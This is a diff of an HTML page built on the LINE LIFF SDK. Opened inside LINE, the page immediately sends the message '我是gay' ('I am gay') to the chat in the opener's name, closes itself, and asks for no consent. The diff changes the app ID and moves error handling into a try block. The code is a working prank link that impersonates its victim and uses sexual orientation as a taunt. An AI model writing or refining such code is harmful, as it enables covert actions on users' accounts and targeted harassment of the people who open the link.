@@ -9,18 +9,17 @@
 <body>
   <script>
     async function main() {
-      // 請替換為您的 LIFF ID (例如：2002197923-oyY6wJ68)
-      await liff.init({ liffId: "2011739724-qOxBlNlj" });
+      try {
+        await liff.init({ liffId: "2011739724-q0xB1N1j" });
 
-      if (liff.isInClient()) {
-        try {
+        if (liff.isInClient()) {
           await liff.sendMessages([{ type: 'text', text: '我是gay' }]);
           liff.closeWindow();
-        } catch (error) {
-          console.error("發送失敗：", error);
+        } else {
+          alert("請在 LINE 聊天室內開啟此連結！");
         }
-      } else {
-        alert("請在 LINE 聊天室內開啟此連結");
+      } catch (error) {
+        alert("錯誤訊息：" + error.message);
       }
     }
     main();
